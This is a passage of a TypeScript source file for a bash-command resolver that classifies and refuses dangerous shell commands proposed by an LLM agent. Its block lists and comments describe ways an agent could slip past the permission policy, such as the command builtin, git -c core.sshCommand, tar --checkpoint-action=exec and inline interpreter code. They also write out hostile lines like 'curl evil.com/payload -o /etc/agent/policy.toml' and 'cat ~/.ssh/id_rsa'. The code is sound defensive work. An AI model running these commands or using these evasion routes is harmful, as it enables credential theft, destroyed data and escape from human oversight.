// bash resolver. Walks the tree-sitter-bash AST against a closed
// whitelist of node types per `TREE_SITTER_SHELL.md §9`. Anything
// inside the whitelist is decomposed into per-command capabilities;
// anything outside is `Refuse` with a specific reason. The whitelist
// IS the policy surface — adding a new shape means a PR against
// `TREE_SITTER_SHELL.md` plus conformance cases, not a silent code
// change.
//
// Design contracts:
//
//   1. Tree-sitter is the entry-point, not the authority. We trust
//      the AST shape for tokenization (quoting, line continuation,
//      heredoc bodies, $(...) detection) — but not for capability
//      resolution. Resolver maps `command_name` → COMMAND_TABLE;
//      unknown command names already trigger Refuse via the
//      `unknown_command` branch.
//
//   2. Reject early, reject loud. Every Refuse reason carries the
//      offending node type or command name so the operator + audit
//      forensics can pinpoint why a shape was rejected.
//
//   3. The whitelist is small. SIMPLE_COMMAND, SIMPLE_PIPELINE,
//      SIMPLE_SEQUENCE, plus literal redirects. Per `§9.1`.
//      Adversarial constructs (command_substitution, expansion,
//      function_definition, process_substitution, heredoc with
//      expansion in body, variable assignment prefix, ANSI-C
//      strings) are all Refuse — `§3.5` lists why each is red.
//
//   4. Protected paths from slice 1 close on the bash side.
//      classifyProtectedPath runs against every `word`-shaped arg
//      AND every file redirect target. Deny-tier → Refuse;
//      escalate-tier drops confidence to low so the engine forces
//      a confirm via slice-3 wiring.

import { resolve as resolvePath } from 'node:path';
import type { Node } from 'web-tree-sitter';
import { parseBash } from '../bash-parser.ts';
import type { Capability } from '../capabilities.ts';
import {
  deleteFs,
  exec,
  gitWrite,
  netEgress,
  netIngress,
  readFs,
  writeFs,
} from '../capabilities.ts';
import { classifyProtectedPath, protectedTargets } from '../protected_paths.ts';
import {
  type Resolver,
  type ResolverContext,
  type ResolverResult,
  registerResolver,
} from './registry.ts';

const isNonEmptyString = (v: unknown): v is string => typeof v === 'string' && v.length > 0;

// Always lexically normalizes via `path.resolve(cwd, ...)` even when
// `path` is already absolute, so `..`/`./` components don't survive
// into the resulting capability scope. See slice 29 / fs.ts:resolveAbs
// for the security rationale.
//
// Tilde expansion (slice 97, R2 P0 finding): bash command-args
// receive the same `~` → `home` mapping the fs resolver applies.
// Without it, `cat ~/.ssh/id_rsa` resolves to a literal `~/.ssh/`
// under cwd in the capability scope, but the SHELL then expands
// `~` to the real HOME on execution — the gap between resolver
// view and runtime view is a §11 bypass. Both shapes the shell
// honors are expanded here:
//   - bare `'~'` → `ctx.home`
//   - `'~/<rest>'` → `<ctx.home>/<rest>`
// `'~user/...'` (other-user expansion) stays literal — the engine
// can't safely resolve another user's home without an OS call,
// and an LLM emitting `~root/...` is far more often an attack
// than a legitimate operator-aliased reference.
const expandTilde = (path: string, home: string): string => {
  if (path === '~') return home;
  if (path.startsWith('~/')) return `${home}/${path.slice(2)}`;
  return path;
};

const resolveArg = (path: string, ctx: ResolverContext): string =>
  resolvePath(ctx.cwd, expandTilde(path, ctx.home));

// POSIX-aware positional extraction: tokens before `--` get the
// classic "starts-with-`-` is a flag" treatment; `--` itself is
// consumed; everything after is positional regardless of leading
// dash (per POSIX utility convention, e.g. `rm -- -rf` deletes a
// file literally named `-rf`).
const stripFlags = (tokens: readonly string[]): string[] => {
  const positional: string[] = [];
  let afterSep = false;
  for (const t of tokens) {
    if (afterSep) {
      positional.push(t);
      continue;
    }
    if (t === '--') {
      afterSep = true;
      continue;
    }
    if (!t.startsWith('-')) positional.push(t);
  }
  return positional;
};

// ─── Whitelist + red-flag node types (§9.1, §3.5) ──────────

// Node types that the resolver knows how to walk. Anything outside
// this set hits the `unsupported_shape` Refuse path. The list is
// intentionally small; new types need PR + conformance case +
// `TREE_SITTER_SHELL.md` update.
const WHITELIST_NODE_TYPES: ReadonlySet<string> = new Set([
  'program',
  'list',
  'pipeline',
  'command',
  'command_name',
  'word',
  'string',
  'string_content',
  'raw_string',
  'concatenation',
  'file_redirect',
  'redirected_statement',
  // File descriptor prefixes / dup targets in redirects.
  // `2>&1`, `cmd >&-`, `1>&2` — file_descriptor + the `>&`/`<&`
  // operator with a numeric target are pure fd manipulation; no
  // filesystem side effect.
  'file_descriptor',
  'number',
  // Operator / punctuation tokens. Tree-sitter exposes these as
  // anonymous nodes named after the literal text.
  '|',
  '||',
  '&&',
  ';',
  '&',
  '>',
  '>>',
  '<',
  '>|',
  '&>',
  '&>>',
  '>&',
  '<&',
  '"',
  "'",
]);

// Node types that, when present, indicate adversarial or dynamic
// shapes the resolver can't safely model. Each maps to a stable
// Refuse reason for the audit log + modal preview.
const RED_FLAG_NODES: ReadonlyMap<string, string> = new Map([
  [
    'command_substitution',
    'command_substitution ($(...) / backtick): inner script runs in subshell context',
  ],
  [
    'process_substitution',
    'process_substitution (<(...) / >(...)): side-effect process outside AST',
  ],
  ['expansion', 'parameter_expansion (${var/...}, ${var:-...}): runtime substitution'],
  ['simple_expansion', 'variable_expansion ($var): value not resolvable statically'],
  ['arithmetic_expansion', 'arithmetic_expansion ($((..))): can read/assign variables'],
  ['function_definition', 'function_definition: scope-dynamic; can shadow built-ins'],
  [
    'variable_assignment',
    'variable_assignment prefix (PATH=/tmp cmd): can override binary resolution',
  ],
  ['subscript', 'array_subscript: indexed/associative array access'],
  ['regex', 'regex_match (=~): runtime evaluation'],
  ['ansi_c_string', "ansi_c_string ($'...'): escape semantics not modeled"],
  ['translated_string', 'translated_string ($"..."): locale-dependent'],
  ['heredoc_redirect', 'heredoc_redirect (<<DELIM): body interpretation not modeled'],
  ['herestring_redirect', 'herestring_redirect (<<<): body interpretation not modeled'],
  ['if_statement', 'if_statement: control flow not modeled'],
  ['while_statement', 'while_statement: control flow not modeled'],
  ['for_statement', 'for_statement: control flow not modeled'],
  ['case_statement', 'case_statement: control flow not modeled'],
  ['subshell', 'subshell ((cmd)): nested execution context'],
  ['compound_statement', 'compound_statement ({cmd;}): block context'],
  ['negated_command', 'negated_command (!cmd): control flow not modeled'],
  ['test_command', 'test_command ([[ ]]): conditional context'],
  ['test_operator', 'test_operator: conditional context'],
]);

// Hard refuses by command name. §13 reject list from
// TREE_SITTER_SHELL.md §7 + §13. mkfs.* matches every filesystem
// variant via prefix.
const HARD_REFUSE_COMMANDS: ReadonlySet<string> = new Set([
  'eval',
  'exec',
  'source',
  '.',
  'trap',
  'alias',
  'shopt',
  'set',
  'unset',
  'declare',
  'export',
  'typeset',
  'readonly',
  'local',
  'dd',
  'fdisk',
  'parted',
  'mkswap',
  'shred',
  // Slice 128 (R4 P0-Launder-1): `command` and `builtin` are bash
  // builtins designed SPECIFICALLY to bypass alias/function lookup
  // and run a command directly. Same threat shape as `eval`: an
  // LLM typing `command rm -rf /home` routes through `cmdSysInfo`
  // (which emits read-fs:/etc only), bypassing cmdRm's delete-fs
  // attribution entirely. A narrow allow rule on read-fs:/etc then
  // admits arbitrary commands. Pre-slice `command` was registered
  // in COMMAND_TABLE as cmdSysInfo (silently treating it as a noop
  // info command) — now it's hard-refused before reaching the
  // table.
  'command',
  'builtin',
]);

const isHardRefuseCommand = (name: string): boolean => {
  if (HARD_REFUSE_COMMANDS.has(name)) return true;
  if (name.startsWith('mkfs.')) return true;
  return false;
};

// Pipe-to-shell pattern detection. A pipeline whose final stage is a
// shell interpreter (`sh`, `bash`, `zsh`, etc.) reads its stdin as a
// script — fully arbitrary. Refuse.
const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
  'sh',
  'bash',
  'zsh',
  'dash',
  'ksh',
  'fish',
]);

// ─── COMMAND_TABLE ─────────────────────────────────────────────

// Per-command resolver. Same shape as slice 3 — takes positional
// args + flags + ctx, returns capabilities + confidence OR refuse
// reason. The whitelist walk decomposes the AST into these inputs
// per `command` node.
type CommandResolverResult =
  | { capabilities: Capability[]; confidence: 'high' | 'medium' }
  | { refuse: string };

type CommandResolver = (
  positional: string[],
  allTokens: readonly string[],
  ctx: ResolverContext,
) => CommandResolverResult;

const cmdRead: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => readFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Pure-output writers (echo / printf). They emit their arguments
// verbatim to stdout — a string like "/etc/passwd" passed to echo
// is NOT a filesystem read, it's text. No read-fs capability is
// attributed. Redirects (`echo hi > /etc/foo`) are still inspected
// separately in `analyzeCommand` and trigger the protected-path
// check on the redirect target regardless of source command.
const cmdEcho: CommandResolver = () => ({ capabilities: [], confidence: 'high' });

// grep / rg: first positional is the regex pattern, NOT a path.
// Skip it. Remaining positionals (if any) are file paths the
// command reads from. With no file positionals the command reads
// from stdin — attribute read-fs of cwd as a conservative floor
// for pipeline composition. The `-exec` escape hatch maps to
// arbitrary exec like find's.
// Slice 128 (R4 P0-Launder-4): grep / find exec-shaped flags.
// All four GNU `find` variants run an arbitrary command; pre-slice
// only `-exec`/`--exec` were detected. `-execdir` is the same
// threat shape with a different cwd at exec time; `-ok` / `-okdir`
// prompt the user but the prompt happens AFTER the binary is
// already invoked (the prompt is a no-op if non-interactive).
const FIND_EXEC_FLAGS: ReadonlySet<string> = new Set([
  '-exec',
  '--exec',
  '-execdir',
  '--execdir',
  '-ok',
  '-okdir',
]);

const cmdGrep: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.some((t) => FIND_EXEC_FLAGS.has(t))) {
    return {
      capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  const pathArgs = positional.slice(1);
  if (pathArgs.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: pathArgs.map((p) => readFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// find: all positionals are filesystem paths (find DIR1 DIR2 -name ...).
// Pattern-style filters arrive as flags and are excluded by stripFlags.
const cmdFind: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.some((t) => FIND_EXEC_FLAGS.has(t))) {
    return {
      capabilities: [exec('arbitrary'), readFs(ctx.cwd)],
      confidence: 'medium',
    };
  }
  const paths = positional.length === 0 ? [ctx.cwd] : positional.map((p) => resolveArg(p, ctx));
  return {
    capabilities: paths.map((p) => readFs(p)),
    confidence: 'high',
  };
};

const cmdRm: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { refuse: 'rm: missing target' };
  }
  return {
    capabilities: positional.map((p) => deleteFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

const cmdMvCp: CommandResolver = (positional, tokens, ctx) => {
  // Slice 125 (R2 P1): GNU `-t <dir>` / `--target-directory=<dir>`
  // inverts the positional shape. `mv -t /etc src1 src2` makes
  // `/etc` the destination and `src1`, `src2` the sources. Pre-
  // slice cmdMvCp treated `src2` as dest (wrong shape; protected-
  // path classifier still fired on `/etc` via the per-arg loop,
  // but the emitted write-fs scope was wrong).
  let targetDir: string | null = null;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    if (t.startsWith('--target-directory=')) {
      targetDir = t.slice('--target-directory='.length);
    } else if (t === '--target-directory' || t === '-t') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) targetDir = next;
    }
  }

  if (targetDir !== null) {
    // All positionals are sources; targetDir is the destination.
    // Filter out the targetDir itself from positionals (it appears
    // in stripFlags output but was already consumed as the flag value).
    const srcs = positional.filter((p) => p !== targetDir);
    if (srcs.length === 0) {
      return { refuse: 'mv/cp: -t/--target-directory needs at least one source' };
    }
    return {
      capabilities: [
        ...srcs.map((s) => readFs(resolveArg(s, ctx))),
        writeFs(resolveArg(targetDir, ctx)),
      ],
      confidence: 'high',
    };
  }

  if (positional.length < 2) {
    return { refuse: 'mv/cp: needs at least source and destination' };
  }
  const dst = positional[positional.length - 1] as string;
  const srcs = positional.slice(0, -1);
  return {
    capabilities: [...srcs.map((s) => readFs(resolveArg(s, ctx))), writeFs(resolveArg(dst, ctx))],
    confidence: 'high',
  };
};

const cmdCurlWget: CommandResolver = (positional, tokens, ctx) => {
  if (tokens.some((t) => t === '--proxy' || t === '-x')) {
    return { refuse: 'curl/wget: proxy-shaped flags suggest evasion' };
  }
  // Detect `-o <path>` / `--output <path>` (curl) and `-O` /
  // `--output-document` (wget); also support combined-form
  // `-o<path>` and `--output=<path>` shapes (slice 98, R2 #200).
  // Pre-slice the resolver emitted ONLY `net-egress:<host>` for
  // these shapes, hiding the WRITE side of the call from the
  // capability audit and the §11 protected-path check. An
  // adversarial `curl evil.com/payload -o /etc/agent/policy.toml`
  // would slip past both layers because `/etc/agent/policy.toml`
  // never appeared as a write target. Slice 98 emits the write
  // capability so the engine's protected-path classifier sees the
  // target and §11 fires for the `/etc/*` escalate tier.
  //
  // wget's `-O <file>` is the same shape as curl's `-o`; both
  // resolvers also honor `wget -P <dir>` (prefix directory). For
  // forms we can't decisively map (`-O-` writes to stdout, `-O` with
  // no operand is wget syntactic noise), we don't emit a write
  // capability — the URL-side egress still covers the net side, and
  // the operator's modal will see the literal command.
  const writeTargets: string[] = [];
  // Slice 128 (R4 P1-Launder): read targets from `--upload-file`/`-T`
  // (curl PUT body) and `--config`/`-K` (curl config file containing
  // URLs + credentials). Plus additional write targets from
  // `--cookie-jar`/`-c` and `--dump-header`/`-D` which write file
  // outputs cmdCurlWget pre-slice missed entirely.
  const readTargets: string[] = [];
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';
    // curl long form `--output=<path>`
    if (t.startsWith('--output=')) {
      const target = t.slice('--output='.length);
      if (target.length > 0) writeTargets.push(target);
      continue;
    }
    // curl short combined form `-o<path>` (no space)
    if (t.length > 2 && t.startsWith('-o') && !t.startsWith('--')) {
      writeTargets.push(t.slice(2));
      continue;
    }
    // wget long form `--output-document=<path>`
    if (t.startsWith('--output-document=')) {
      const target = t.slice('--output-document='.length);
      if (target.length > 0) writeTargets.push(target);
      continue;
    }
    // Slice 128: --cookie-jar / -c <path> writes cookies.
    if (t.startsWith('--cookie-jar=')) {
      const target = t.slice('--cookie-jar='.length);
      if (target.length > 0) writeTargets.push(target);
      continue;
    }
    // Slice 128: --dump-header / -D <path> writes response headers.
    if (t.startsWith('--dump-header=')) {
      const target = t.slice('--dump-header='.length);
      if (target.length > 0) writeTargets.push(target);
      continue;
    }
    // Slice 128: --upload-file / -T <path> reads file as PUT body.
    if (t.startsWith('--upload-file=')) {
      const target = t.slice('--upload-file='.length);
      if (target.length > 0) readTargets.push(target);
      continue;
    }
    // Slice 128: --config / -K <path> reads URL list / credentials.
    if (t.startsWith('--config=')) {
      const target = t.slice('--config='.length);
      if (target.length > 0) readTargets.push(target);
      continue;
    }
    // Separated forms: `-o <path>`, `--output <path>`, `-O <path>`,
    // `--output-document <path>`. Skip the value-less degenerate
    // shape `-O-` (writes to stdout) and `-O` followed by another
    // flag (likely a typo; let the operator's modal catch it).
    if (t === '-o' || t === '--output' || t === '-O' || t === '--output-document') {
      const next = tokens[i + 1];
      if (next !== undefined && next !== '-' && !next.startsWith('-')) {
        writeTargets.push(next);
        i += 1;
      }
      continue;
    }
    // Slice 128 (R4 P1-Launder): separated forms for the new flags.
    if (t === '--cookie-jar' || t === '-c' || t === '--dump-header' || t === '-D') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        writeTargets.push(next);
        i += 1;
      }
      continue;
    }
    if (t === '--upload-file' || t === '-T' || t === '--config' || t === '-K') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        readTargets.push(next);
        i += 1;
      }
    }
  }
  const urlToken = positional[0];
  const writeCaps = writeTargets.map((p) => writeFs(resolveArg(p, ctx)));
  // Slice 128 (R4 P1-Launder): include the new read targets in the
  // emitted capability set so the engine's per-arg classifier sees
  // them.
  const readCaps = readTargets.map((p) => readFs(resolveArg(p, ctx)));
  if (urlToken === undefined) {
    return {
      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
      confidence: 'medium',
    };
  }
  try {
    const host = new URL(urlToken).hostname.toLowerCase();
    return {
      capabilities: [netEgress(host || '*'), ...writeCaps, ...readCaps],
      confidence: 'high',
    };
  } catch {
    return {
      capabilities: [netEgress('*'), ...writeCaps, ...readCaps],
      confidence: 'medium',
    };
  }
};

const cmdGit: CommandResolver = (positional, tokens, ctx) => {
  // Slice 128 (R4 P0-Launder-2): `git -c <key>=<value>` sets a
  // one-shot config override. Several git config keys execute
  // arbitrary commands:
  //   core.sshCommand    — used by every git remote operation
  //   core.pager         — pages log/diff output
  //   core.fsmonitor     — invoked on status
  //   core.editor        — invoked on commit / rebase
  //   gpg.program        — sign / verify
  // An LLM typing `git -c core.sshCommand='sh -c "id"' clone X`
  // bypasses cmdGit's clone case (because `-c` is in tokens but
  // `core.sshCommand=...` is a positional [stripFlags doesn't
  // strip non-`-` tokens]). The switch picks `clone` as the
  // subcommand — emits gitWrite + netEgress but NO exec:arbitrary.
  //
  // Defense: refuse static analysis when `-c` or `--config-env`
  // is present. Operator workflows that legitimately need git
  // config overrides should use `~/.gitconfig` or per-repo
  // `.git/config` instead (which the engine can audit through the
  // file path).
  //
  // Also: `--exec-path=<path>` overrides where git looks for its
  // helper binaries — attacker can plant a fake `git-clone` at
  // `<path>/git-clone` and trigger it via the surrounding clone
  // call. Refuse.
  for (const t of tokens) {
    if (t === '-c' || t === '--config-env') {
      return {
        refuse:
          'git: -c / --config-env overrides arbitrary git config (including core.sshCommand / core.pager) — refusing static analysis',
      };
    }
    if (t === '--exec-path' || t.startsWith('--exec-path=')) {
      return {
        refuse:
          'git: --exec-path overrides git helper-binary lookup path — refusing static analysis',
      };
    }
  }
  const sub = positional[0];
  const REPO = ctx.cwd;
  if (sub === undefined) {
    return { capabilities: [readFs(REPO)], confidence: 'high' };
  }
  switch (sub) {
    case 'status':
    case 'log':
    case 'diff':
    case 'show':
    case 'blame':
    case 'rev-parse':
    case 'config':
    case 'remote':
      return { capabilities: [readFs(REPO)], confidence: 'high' };
    case 'commit':
    case 'add':
    case 'merge':
    case 'rebase':
    case 'cherry-pick':
    case 'stash':
    case 'tag':
    case 'reset':
      return { capabilities: [gitWrite(REPO), readFs(REPO)], confidence: 'high' };
    case 'push':
    case 'pull':
    case 'fetch':
      return {
        capabilities: [gitWrite(REPO), netEgress('*'), readFs(REPO)],
        confidence: 'high',
      };
    case 'clean':
      if (tokens.some((t) => /^-f/.test(t))) {
        return { capabilities: [deleteFs(REPO), gitWrite(REPO)], confidence: 'high' };
      }
      return { capabilities: [readFs(REPO)], confidence: 'high' };
    default:
      return {
        capabilities: [gitWrite(REPO), readFs(REPO), netEgress('*')],
        confidence: 'medium',
      };
  }
};

// Node-ecosystem package managers (npm, yarn, pnpm, bun). Hosts and
// target dirs reflect what those tools actually touch — `node_modules`
// under cwd, plus the npm + yarn registries. Pre-slice 100 (R2 #205)
// `cmdPkgInstall` collapsed every package manager to the SAME shape,
// emitting npm hosts for pip and pypi hosts for npm; the audit row
// lied about which network namespace each invocation actually reached.
const cmdNpmLike: CommandResolver = (_positional, _tokens, ctx) => {
  return {
    capabilities: [
      exec('arbitrary'),
      writeFs(resolvePath(ctx.cwd, 'node_modules')),
      readFs(ctx.cwd),
      netEgress('registry.npmjs.org'),
      netEgress('registry.yarnpkg.com'),
    ],
    confidence: 'medium',
  };
};

// Python ecosystem (pip, pip3). pip writes to site-packages (system or
// venv path; we don't try to resolve it deterministically — `arbitrary
// + read-fs:cwd` covers the worst case) and reaches PyPI. Other
// registries (private mirrors, conda) require operator-side allow
// rules that match the explicit `--index-url` flag — out of scope
// for the static resolver.
const cmdPip: CommandResolver = (_positional, _tokens, ctx) => {
  return {
    capabilities: [exec('arbitrary'), readFs(ctx.cwd), netEgress('pypi.org')],
    confidence: 'medium',
  };
};

const cmdChmodChown: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { refuse: 'chmod/chown: missing target' };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// Language interpreters (python, python3, node, ruby, perl). Slice
// 100 (R2 #208): pre-slice the resolver emitted `exec:arbitrary +
// read-fs:cwd` for ANY invocation regardless of args — including
// the `-c "..."` shape that hands the interpreter an arbitrary code
// string to execute. While `exec:arbitrary` honestly admits "this
// can run anything", it doesn't distinguish a script-file invocation
// (statically analyzable) from inline-code execution. A policy that
// allowed `exec:python` via a narrow bash allow rule for known
// `python script.py` invocations would silently admit `python -c
// "import os; os.system('rm -rf /')"` under the same umbrella.
//
// Defense: refuse when `-c <code>` is present. Operators wanting
// inline interpreter exec must wire it through a separate tool with
// explicit confirm semantics; the bash resolver isn't the right
// place to model arbitrary inline-code execution shapes.
const cmdInterpreter: CommandResolver = (_positional, tokens, ctx) => {
  // `-c` indicates inline code. Both POSIX (`python -c "code"`) and
  // perl-specific variants (`-e`/`-E` for one-liners) collapse here
  // — perl's `-e` is the same threat model. Refuse the lot.
  //
  // Slice 128 (R4 P1-Launder): node accepts `--eval` (long form of
  // `-e`) which slice 100 missed. Refuse it under the same banner.
  // Also `-m <module>` for python (loads + executes a module by
  // name) is the same threat shape; refuse.
  let hasNetIngress = false;
  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i];
    if (t === '-c' || t === '-e' || t === '-E' || t === '--eval' || t === '-m') {
      return {
        refuse: `interpreter: '${t} <code>' executes inline code; refusing static analysis`,
      };
    }
    // Slice 128 (R4 P1-Launder): `node --inspect[=<host:port>]` /
    // `--inspect-brk[=...]` opens a debugger listener. Anything
    // reaching the port gets full V8 control. Attribute net-ingress
    // so the operator's policy sees the listener side effect.
    if (
      t === '--inspect' ||
      t === '--inspect-brk' ||
      (t !== undefined && (t.startsWith('--inspect=') || t.startsWith('--inspect-brk=')))
    ) {
      hasNetIngress = true;
    }
  }
  const caps: Capability[] = [exec('arbitrary'), readFs(ctx.cwd)];
  if (hasNetIngress) caps.push(netIngress('*'));
  return {
    capabilities: caps,
    confidence: 'high',
  };
};

// No-op commands: builtins / utilities with no filesystem or
// network side effect. They get just the baseline `exec:shell`
// from the aggregator above. Listed explicitly here (instead of
// falling through to "unknown command Refuse") so common operator
// shapes don't pop a modal for every `sleep 30` or `true`.
const cmdNoOp: CommandResolver = () => ({ capabilities: [], confidence: 'high' });

// Read-only system info / identity / lookup utilities. They
// consult system state (env, /etc/passwd, /etc/group, $PATH
// resolution); resolver attributes a coarse read-fs of /etc as
// the worst case. The classifier_protected_paths will still
// catch any caller-supplied paths.
const cmdSysInfo: CommandResolver = () => ({
  capabilities: [readFs('/etc')],
  confidence: 'high',
});

// Filesystem-mutating utilities that create or touch a target.
// mkdir / touch / ln / mktemp: positional args are the targets.
const cmdMkdir: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [writeFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// `cd` is a builtin; in a tool-call context the cwd change doesn't
// persist between invocations, so there's no observable fs side
// effect. We attribute read-fs of the target dir for completeness.
const cmdCd: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    return { capabilities: [readFs(ctx.cwd)], confidence: 'high' };
  }
  return {
    capabilities: [readFs(resolveArg(positional[0] as string, ctx))],
    confidence: 'high',
  };
};

// ─── Slice 120 (R2 #199) — archive / remote / build resolvers ───
//
// Pre-slice the registry lacked entries for `tar`, `tee`, `ssh`,
// `scp`, `rsync`, `make`, `cargo` — all common operator commands
// that fell through to the `unknown_command` Refuse path. The
// fall-through is safe (no capability leak) but ergonomically
// hostile: every `tar -cf release.tar dist/` popped a manual-
// confirm modal instead of an audited Allow with the correct
// capability shape.
//
// Each resolver here returns the narrowest honest capability set
// the command's flag schema admits. Confidence is `medium` for
// shapes that can't be fully resolved statically (archive
// traversal targets, Makefile recipes, build.rs scripts) and
// `high` for shapes that ARE statically determined (tee writes
// to its positionals).

// `tee [-a] FILE...` — copies stdin to stdout AND to each FILE.
// No filesystem read implied (stdin is upstream-fed). Each
// positional is a write target. `-a` only changes append vs
// truncate; the capability shape is the same.
const cmdTee: CommandResolver = (positional, _tokens, ctx) => {
  if (positional.length === 0) {
    // No targets — copies stdin to stdout only. No fs side effect.
    return { capabilities: [], confidence: 'high' };
  }
  return {
    capabilities: positional.map((p) => writeFs(resolveArg(p, ctx))),
    confidence: 'high',
  };
};

// `tar` — three modes (create/extract/list) with very different
// capability shapes. The short-flag bundle `-czf`/`-xvf`/`-tvf`
// is the canonical operator form on every Unix; we decode it
// here instead of relying on stripFlags's positional-only view.
//
// Flag schema we honor:
//   -c / --create        → create mode
//   -x / --extract       → extract mode
//   -t / --list          → list mode
//   -f <path> / --file=  → archive path (consumed from positionals)
//   -C <path> / --directory= → output dir for extract (consumed)
//
// Compression flags (`-z`/`-j`/`-J`/`--gzip` etc.) don't change
// the capability shape and are ignored.
//
// Capability shape per mode:
//   create  → write-fs(archive), read-fs(each input path)
//   extract → read-fs(archive),  write-fs(output dir or cwd)
//   list    → read-fs(archive)
//   unknown → read-fs(cwd) + write-fs(cwd) at medium confidence
//             (defensive: a malformed invocation could still do
//             anything; let the operator's modal decide).
//
// Out of scope: path-traversal-in-archive (a crafted archive
// can extract `../../etc/passwd`). The resolver can't see the
// archive contents at planning time; the sandbox profile and §11
// classifier together still mask the extraction destination.
// Confidence stays `medium` to flag the inherent uncertainty.
const cmdTar: CommandResolver = (positional, tokens, ctx) => {
  // Slice 125 (R2 P0-1): GTFOBins arbitrary-exec flags. Documented
  // tar flags whose value is a SHELL COMMAND, not a path:
  //   --checkpoint-action=exec=<cmd>  — runs <cmd> at each checkpoint
  //   --use-compress-program=<cmd>    — pipes the archive through <cmd>
  //   --to-command=<cmd>              — runs <cmd> for each entry
  // Pre-slice the resolver treated these as ordinary `--flag=value`
  // pairs; the protected-path classifier saw `exec=rm-rf` as a path
  // candidate under cwd, didn't match a deny zone, and cmdTar
  // emitted a normal tar shape. A narrow `tar` allow rule would
  // admit arbitrary local exec via any of these. Symmetric to ssh's
  // ProxyCommand refuse — hard refuse the lot.
  for (const t of tokens) {
    if (t.startsWith('--checkpoint-action=')) {
      const value = t.slice('--checkpoint-action='.length);
      // `--checkpoint-action=exec=<cmd>` is the exploit; other
      // values (sleep, ttyout, dot, totals, bell) are benign.
      if (value.startsWith('exec=') || value === 'exec') {
        return {
          refuse:
            'tar: --checkpoint-action=exec=<cmd> runs an arbitrary command — refusing static analysis',
        };
      }
    }
    if (t === '--checkpoint-action') {
      // Space-separated form. We can't safely peek the next token
      // because numeric values are stripped from args by tree-
      // sitter — refuse unconditionally; the legitimate forms
      // (sleep, dot) are equally unanalyzable via the static
      // resolver.
      return {
        refuse:
          'tar: --checkpoint-action <value> requires runtime inspection — refusing static analysis',
      };
    }
    if (t === '--use-compress-program' || t.startsWith('--use-compress-program=')) {
      return {
        refuse:
          'tar: --use-compress-program executes an arbitrary program as the compressor — refusing static analysis',
      };
    }
    if (t === '--to-command' || t.startsWith('--to-command=')) {
      return {
        refuse: 'tar: --to-command runs an arbitrary command per entry — refusing static analysis',
      };
    }
    // Slice 127 (R3 P2): additional GTFOBins exec / path-read vectors
    // per `man tar` — all admit attacker-controlled exec or
    // attacker-controlled file reads via the flag value.
    if (t === '--rmt-command' || t.startsWith('--rmt-command=')) {
      return {
        refuse: 'tar: --rmt-command executes an arbitrary rmt program — refusing static analysis',
      };
    }
    if (
      t === '--info-script' ||
      t.startsWith('--info-script=') ||
      t === '--new-volume-script' ||
      t.startsWith('--new-volume-script=')
    ) {
      return {
        refuse:
          'tar: --info-script / --new-volume-script run an arbitrary command at volume change — refusing static analysis',
      };
    }
    if (t === '--owner-map' || t.startsWith('--owner-map=')) {
      return {
        refuse:
          'tar: --owner-map reads an attacker-controllable mapping file — refusing static analysis',
      };
    }
    if (t === '--group-map' || t.startsWith('--group-map=')) {
      return {
        refuse:
          'tar: --group-map reads an attacker-controllable mapping file — refusing static analysis',
      };
    }
    if (t === '-I') {
      // Short-form alias for --use-compress-program.
      return {
        refuse:
          'tar: -I (alias of --use-compress-program) executes an arbitrary compressor — refusing static analysis',
      };
    }
    // Slice 127 (R3 P0-1): the bundle form `tar -zIf prog archive`
    // packs `I` into the short-flag bundle and consumes `prog` as
    // its value via positional lookahead. Pre-slice the bundle
    // decoder (further down) only inspected `c`/`x`/`t`/`f` chars;
    // `I` slipped through and the resolver emitted a normal tar
    // shape with `prog` mis-attributed as an input path. Detect
    // the bundle form here and refuse.
    if (t.startsWith('-') && !t.startsWith('--') && t.length > 1) {
      const bundle = t.slice(1);
      if (bundle.includes('I')) {
        return {
          refuse:
            'tar: -I (alias of --use-compress-program) in bundled-flag form executes an arbitrary compressor — refusing static analysis',
        };
      }
    }
  }

  let mode: 'create' | 'extract' | 'list' | 'unknown' = 'unknown';
  let archivePath: string | null = null;
  let outputDir: string | null = null;
  // Token-consumed positionals (archive path, output dir) — when
  // we later filter `positional` for input paths, these must be
  // excluded. Strings, not indices, because stripFlags renumbers.
  const consumed = new Set<string>();

  for (let i = 0; i < tokens.length; i += 1) {
    const t = tokens[i] ?? '';

    if (t === '--create') {
      mode = 'create';
      continue;
    }
    if (t === '--extract' || t === '--get') {
      mode = 'extract';
      continue;
    }
    if (t === '--list') {
      mode = 'list';
      continue;
    }
    if (t.startsWith('--file=')) {
      archivePath = t.slice('--file='.length);
      continue;
    }
    if (t === '--file') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        archivePath = next;
        consumed.add(next);
        i += 1;
      }
      continue;
    }
    if (t.startsWith('--directory=')) {
      outputDir = t.slice('--directory='.length);
      continue;
    }
    if (t === '--directory' || t === '-C') {
      const next = tokens[i + 1];
      if (next !== undefined && !next.startsWith('-')) {
        outputDir = next;
